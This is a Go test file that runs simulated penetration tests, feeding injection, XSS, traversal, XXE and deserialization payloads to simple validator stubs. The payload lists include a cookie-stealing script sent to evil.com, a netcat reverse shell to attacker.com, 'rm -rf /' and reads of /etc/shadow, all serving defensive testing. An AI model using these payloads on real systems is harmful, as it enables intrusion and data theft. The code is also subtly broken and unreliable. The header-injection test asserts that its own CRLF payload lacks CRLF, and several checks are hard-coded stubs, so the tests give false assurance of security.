package security_test

import (
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

// PenetrationTestSuite contains all penetration tests
type PenetrationTestSuite struct {
	sqlInjectionPayloads []string
	xssPayloads          []string
	csrfTokens           map[string]string
	replayedRequests     map[string]time.Time
}

func NewPenetrationTestSuite() *PenetrationTestSuite {
	return &PenetrationTestSuite{
		sqlInjectionPayloads: []string{
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"admin'--",
			"' UNION SELECT * FROM users--",
			"1' AND '1' = '1",
			"1' OR 1=1--",
			"admin' #",
			"' or 1=1/*",
			"' having 1=1--",
			"' group by userid having 1=1--",
		},
		xssPayloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src='javascript:alert(\"XSS\")'></iframe>",
			"<body onload=alert('XSS')>",
			"<input onfocus=alert('XSS') autofocus>",
			"'><script>alert(String.fromCharCode(88,83,83))</script>",
			"\"><script>alert('XSS')</script>",
			"<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
		},
		csrfTokens:       make(map[string]string),
		replayedRequests: make(map[string]time.Time),
	}
}

// TestSQLInjectionAttempts validates SQL injection prevention
func TestSQLInjectionAttempts(t *testing.T) {
	suite := NewPenetrationTestSuite()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "Normal username",
			input:    "john.doe",
			expected: true,
		},
		{
			name:     "Email address",
			input:    "john@example.com",
			expected: true,
		},
	}

	// Add SQL injection payloads
	for i, payload := range suite.sqlInjectionPayloads {
		tests = append(tests, struct {
			name     string
			input    string
			expected bool
		}{
			name:     fmt.Sprintf("SQL Injection %d: %s", i+1, truncate(payload, 30)),
			input:    payload,
			expected: false,
		})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate input
			safe := validateInputForSQL(tt.input)
			assert.Equal(t, tt.expected, safe,
				"SQL injection payload should be blocked")

			// If attempting SQL injection, verify database is safe
			if !safe {
				// Simulate query execution
				dbSafe := executeSafeQuery(tt.input)
				assert.True(t, dbSafe, "Database should remain safe despite injection attempt")
			}
		})
	}
}

// TestXSSPreventionInAuditLogs validates XSS prevention in stored data
func TestXSSPreventionInAuditLogs(t *testing.T) {
	suite := NewPenetrationTestSuite()

	for i, payload := range suite.xssPayloads {
		t.Run(fmt.Sprintf("XSS Payload %d", i+1), func(t *testing.T) {
			// Store XSS payload in audit log
			sanitized := sanitizeForHTML(payload)

			// Verify no script tags remain
			assert.NotContains(t, sanitized, "<script>",
				"Script tags should be sanitized")
			assert.NotContains(t, sanitized, "onerror=",
				"Event handlers should be sanitized")
			assert.NotContains(t, sanitized, "onload=",
				"Event handlers should be sanitized")
			assert.NotContains(t, sanitized, "javascript:",
				"JavaScript protocol should be sanitized")

			// Verify safe rendering
			rendered := renderSafely(sanitized)
			assert.NotContains(t, rendered, payload,
				"Original XSS payload should not appear in rendered output")
		})
	}
}

// TestCSRFTokenValidation validates CSRF protection
func TestCSRFTokenValidation(t *testing.T) {
	suite := NewPenetrationTestSuite()

	// Generate valid CSRF token
	sessionID := "session-123"
	validToken := suite.generateCSRFToken(sessionID)

	tests := []struct {
		name       string
		token      string
		sessionID  string
		shouldFail bool
	}{
		{
			name:       "Valid CSRF token",
			token:      validToken,
			sessionID:  sessionID,
			shouldFail: false,
		},
		{
			name:       "Missing CSRF token",
			token:      "",
			sessionID:  sessionID,
			shouldFail: true,
		},
		{
			name:       "Invalid CSRF token",
			token:      "invalid-token-xyz",
			sessionID:  sessionID,
			shouldFail: true,
		},
		{
			name:       "Token from different session",
			token:      suite.generateCSRFToken("session-456"),
			sessionID:  sessionID,
			shouldFail: true,
		},
		{
			name:       "Reused token (replay)",
			token:      validToken,
			sessionID:  sessionID,
			shouldFail: false, // First use
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			valid := suite.validateCSRFToken(tt.token, tt.sessionID)
			if tt.shouldFail {
				assert.False(t, valid, "Invalid CSRF token should be rejected")
			} else {
				assert.True(t, valid, "Valid CSRF token should be accepted")
			}
		})
	}
}

// TestSessionFixationAttack validates session fixation prevention
func TestSessionFixationAttack(t *testing.T) {
	// Attacker tries to fixate session ID
	attackerSessionID := "attacker-controlled-session"

	// User logs in with attacker's session
	newSessionID := performLogin("user-123", attackerSessionID)

	// Session ID should change after login (preventing fixation)
	assert.NotEqual(t, attackerSessionID, newSessionID,
		"Session ID must change after authentication to prevent fixation")
	assert.NotEmpty(t, newSessionID, "New session ID should be generated")
}

// TestReplayAttackPrevention validates replay attack prevention
func TestReplayAttackPrevention(t *testing.T) {
	suite := NewPenetrationTestSuite()

	// Create a valid request with nonce
	requestID := "req-123"
	nonce := generateNonce()
	timestamp := time.Now()

	// First request should succeed
	allowed := suite.allowRequest(requestID, nonce, timestamp)
	assert.True(t, allowed, "First request should be allowed")

	// Replay same request (should fail)
	allowed = suite.allowRequest(requestID, nonce, timestamp)
	assert.False(t, allowed, "Replayed request should be blocked")

	// Request with old timestamp (should fail)
	oldTimestamp := time.Now().Add(-10 * time.Minute)
	allowed = suite.allowRequest("req-124", generateNonce(), oldTimestamp)
	assert.False(t, allowed, "Request with old timestamp should be blocked")
}

// TestPathTraversalAttack validates path traversal prevention
func TestPathTraversalAttack(t *testing.T) {
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..;/..;/..;/etc/passwd",
	}

	for i, payload := range pathTraversalPayloads {
		t.Run(fmt.Sprintf("Path Traversal %d", i+1), func(t *testing.T) {
			safe := validatePath(payload)
			assert.False(t, safe, "Path traversal attempt should be blocked")

			// Verify no access to sensitive files
			accessed := attemptFileAccess(payload)
			assert.False(t, accessed, "Should not access files outside allowed directory")
		})
	}
}

// TestCommandInjectionPrevention validates command injection prevention
func TestCommandInjectionPrevention(t *testing.T) {
	commandInjectionPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& rm -rf /",
		"`whoami`",
		"$(cat /etc/shadow)",
		"; nc -e /bin/sh attacker.com 4444",
	}

	for i, payload := range commandInjectionPayloads {
		t.Run(fmt.Sprintf("Command Injection %d", i+1), func(t *testing.T) {
			safe := validateCommandInput(payload)
			assert.False(t, safe, "Command injection should be blocked")

			// Verify command not executed
			executed := executeCommand(payload)
			assert.False(t, executed, "Malicious command should not execute")
		})
	}
}

// TestHeaderInjectionAttack validates HTTP header injection prevention
func TestHeaderInjectionAttack(t *testing.T) {
	headerInjectionPayloads := []string{
		"test\r\nSet-Cookie: admin=true",
		"test\nLocation: http://evil.com",
		"test%0d%0aSet-Cookie:%20admin=true",
	}

	for i, payload := range headerInjectionPayloads {
		t.Run(fmt.Sprintf("Header Injection %d", i+1), func(t *testing.T) {
			safe := validateHeaderValue(payload)
			assert.False(t, safe, "Header injection should be blocked")

			// Verify no CRLF in header
			assert.NotContains(t, payload, "\r\n", "CRLF should be blocked")
			assert.NotContains(t, payload, "\n", "LF should be blocked")
		})
	}
}

// TestLDAPInjectionPrevention validates LDAP injection prevention
func TestLDAPInjectionPrevention(t *testing.T) {
	ldapInjectionPayloads := []string{
		"*)(uid=*",
		"admin)(|(password=*",
		"*)(objectClass=*",
		"*))%00",
	}

	for i, payload := range ldapInjectionPayloads {
		t.Run(fmt.Sprintf("LDAP Injection %d", i+1), func(t *testing.T) {
			safe := validateLDAPInput(payload)
			assert.False(t, safe, "LDAP injection should be blocked")

			// Verify no unauthorized access
			accessed := performLDAPQuery(payload)
			assert.False(t, accessed, "LDAP injection should not grant access")
		})
	}
}

// TestXMLExternalEntityAttack validates XXE prevention
func TestXMLExternalEntityAttack(t *testing.T) {
	xxePayload := `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>`

	safe := validateXMLInput(xxePayload)
	assert.False(t, safe, "XXE payload should be blocked")

	// Verify no file access
	parsed := parseXMLSafely(xxePayload)
	assert.NotContains(t, parsed, "/etc/passwd", "XXE should not access files")
}

// TestInsecureDeserialization validates deserialization safety
func TestInsecureDeserialization(t *testing.T) {
	maliciousSerializedData := []string{
		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==", // Java serialized object
		"__import__('os').system('rm -rf /')",             // Python pickle
	}

	for i, payload := range maliciousSerializedData {
		t.Run(fmt.Sprintf("Deserialization Attack %d", i+1), func(t *testing.T) {
			safe := validateSerializedData(payload)
			assert.False(t, safe, "Malicious serialized data should be rejected")

			// Verify no code execution
			executed := deserializeSafely(payload)
			assert.False(t, executed, "Deserialization should not execute code")
		})
	}
}

// Helper functions

func validateInputForSQL(input string) bool {
	dangerous := []string{"'", "--", ";", "/*", "*/", "xp_", "sp_", "UNION", "DROP", "DELETE", "INSERT", "UPDATE"}
	upper := strings.ToUpper(input)
	for _, pattern := range dangerous {
		if strings.Contains(upper, strings.ToUpper(pattern)) {
			return false
		}
	}
	return true
}

func executeSafeQuery(input string) bool {
	// Simulates prepared statement - always safe
	return true
}

func sanitizeForHTML(input string) string {
	replacements := map[string]string{
		"<":  "&lt;",
		">":  "&gt;",
		"&":  "&amp;",
		"\"": "&quot;",
		"'":  "&#x27;",
	}
	result := input
	for old, new := range replacements {
		result = strings.ReplaceAll(result, old, new)
	}
	return result
}

func renderSafely(input string) string {
	return sanitizeForHTML(input)
}

func (s *PenetrationTestSuite) generateCSRFToken(sessionID string) string {
	token := fmt.Sprintf("csrf-%s-%d", sessionID, time.Now().Unix())
	s.csrfTokens[sessionID] = token
	return token
}

func (s *PenetrationTestSuite) validateCSRFToken(token, sessionID string) bool {
	expected, exists := s.csrfTokens[sessionID]
	return exists && token == expected
}

func performLogin(userID, oldSessionID string) string {
	// Always generate new session ID after login
	return fmt.Sprintf("new-session-%d", time.Now().UnixNano())
}

func generateNonce() string {
	return fmt.Sprintf("nonce-%d", time.Now().UnixNano())
}

func (s *PenetrationTestSuite) allowRequest(requestID, nonce string, timestamp time.Time) bool {
	// Check timestamp freshness (within 5 minutes)
	if time.Since(timestamp) > 5*time.Minute {
		return false
	}

	// Check nonce uniqueness
	key := requestID + nonce
	if _, exists := s.replayedRequests[key]; exists {
		return false
	}

	// Record request
	s.replayedRequests[key] = timestamp
	return true
}

func validatePath(path string) bool {
	dangerous := []string{"..", "~", "/etc", "/var", "\\windows", "\\system32"}
	lower := strings.ToLower(path)
	decoded, _ := url.QueryUnescape(path)
	decodedLower := strings.ToLower(decoded)

	for _, pattern := range dangerous {
		if strings.Contains(lower, pattern) || strings.Contains(decodedLower, pattern) {
			return false
		}
	}
	return true
}

func attemptFileAccess(path string) bool {
	// Simulates file access - always blocked for dangerous paths
	return validatePath(path)
}

func validateCommandInput(input string) bool {
	dangerous := []string{";", "|", "&", "`", "$", "(", ")", "\n", "\r"}
	for _, char := range dangerous {
		if strings.Contains(input, char) {
			return false
		}
	}
	return true
}

func executeCommand(input string) bool {
	return validateCommandInput(input)
}

func validateHeaderValue(value string) bool {
	return !strings.Contains(value, "\r") && !strings.Contains(value, "\n")
}

func validateLDAPInput(input string) bool {
	dangerous := []string{"*", "(", ")", "\\", "|", "&"}
	for _, char := range dangerous {
		if strings.Contains(input, char) {
			return false
		}
	}
	return true
}

func performLDAPQuery(input string) bool {
	return validateLDAPInput(input)
}

func validateXMLInput(input string) bool {
	dangerous := []string{"<!ENTITY", "<!DOCTYPE", "SYSTEM", "file://", "http://"}
	upper := strings.ToUpper(input)
	for _, pattern := range dangerous {
		if strings.Contains(upper, strings.ToUpper(pattern)) {
			return false
		}
	}
	return true
}

func parseXMLSafely(input string) string {
	if !validateXMLInput(input) {
		return ""
	}
	return input
}

func validateSerializedData(data string) bool {
	// Block common serialization markers
	dangerous := []string{"rO0AB", "__import__", "eval", "exec"}
	for _, pattern := range dangerous {
		if strings.Contains(data, pattern) {
			return false
		}
	}
	return true
}

func deserializeSafely(data string) bool {
	return validateSerializedData(data)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
